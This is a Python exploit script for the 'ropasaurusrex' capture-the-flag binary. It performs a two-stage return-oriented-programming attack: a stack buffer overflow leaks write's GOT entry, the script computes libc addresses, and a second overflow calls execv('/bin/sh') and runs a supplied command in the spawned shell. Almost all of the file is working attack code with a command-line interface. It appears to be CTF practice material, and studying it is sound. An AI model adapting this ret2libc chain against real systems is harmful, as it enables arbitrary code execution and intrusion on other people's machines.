#!/usr/bin/python

import os
import argparse
import sys
from time import sleep
from helper import *

def exploit(args):
    # Addresses from ropasaurusrex
    write_plt_address = 0x0804830c
    write_got_address = 0x08049614
    read_got_address = 0x0804961c
    null_pointer_exec_address = 0x08048000 + 8 # Load address + 8
    gadget_address = 0x080484b5 # POP, POP, POP, POP, RET
    main_function_address = 0x0804841d

    # Offsets from libc.so.6
    # NOTE: These are values from the attached libc, update this value
    #       with those of yours. If your system is 64 bits use /lib32/
    # objdump -d /lib/libc.so.6 | grep -E '<__write>:'
    write_libc_offset = 0x000c6510
    # objdump -d /lib/libc.so.6 | grep -E '<execv>:'
    execv_libc_offset = 0x00098ad0
    # bgrep '2f 62 69 6e 2f 73 68' /lib/libc.so.6
    binsh_libc_offset = 0x001217F3

    # Got from pattern_{create,offset}.rb
    offset_to_return_address = 140
    buffer_overflower = ("A" * offset_to_return_address).encode()

    # Let's build the first stage of our attack
    expl = buffer_overflower

    expl += int2bytes(write_plt_address) # Address of the write in the PLT
    expl += int2bytes(gadget_address)    # Address of POP, POP, POP, POP, RET
    expl += int2bytes(1)                 # stdout
    expl += int2bytes(write_got_address) # GOT entry for write
    expl += int2bytes(4)                 # Byte to write to stdout
    expl += int2bytes(0xB00BB00B)        # Foo value for the fourth POP

    # At the end, jump back to main
    expl += int2bytes(main_function_address)

    # Send the exploit
    write_bytes(expl)

    # Read the actual address of the write function
    write_address_int = bytes2int(read_bytes(4))

    # Compute the actual addresses of execv and "/bin/sh\0"
    execv_address = (write_address_int - write_libc_offset) + execv_libc_offset
    binsh_address = (write_address_int - write_libc_offset) + binsh_libc_offset

    log("Write should be at 0x" + int2hex(write_address_int))
    log("execv should be at 0x" + int2hex(execv_address))
    log("/bin/sh should be at 0x" + int2hex(binsh_address))

    if args.wait:
        sleep(args.wait)
        log("Launching the second part of the attack")

    # Prepare the second phase of the exploit
    expl = buffer_overflower

    expl += int2bytes(execv_address)             # Address of execv
    expl += int2bytes(0xBBBBBBBB)                # Final return address
    expl += int2bytes(binsh_address)             # Pointer to "/bin/sh\0"
    expl += int2bytes(null_pointer_exec_address) # Pointer a NULL word

    # Send the exploit
    write_bytes(expl)

    # Needed to let the new process get control of stdin
    sleep(0.1)

    # Launch the command to the shell
    write_string(args.command + "\n")

    # Read the response
    log(read_all())

    return

def main():
    parser = argparse.ArgumentParser(description='Gotta pwn them all.')

    parser.add_argument('-x', "--command", metavar='COMMAND', default="exec ls", 
                        help='Command to execute once we get the shell.')
    parser.add_argument('-w', '--wait', metavar='SECONDS', default=None, 
                        type=int, help="Seconds to wait before launching the "
                        "second part of the attack (debugging purposes).")

    args = parser.parse_args()
    unbuffer_streams()

    log("Started with args: " + str(sys.argv))
    exploit(args)
    log("Finish")

if __name__ == "__main__":
    main()
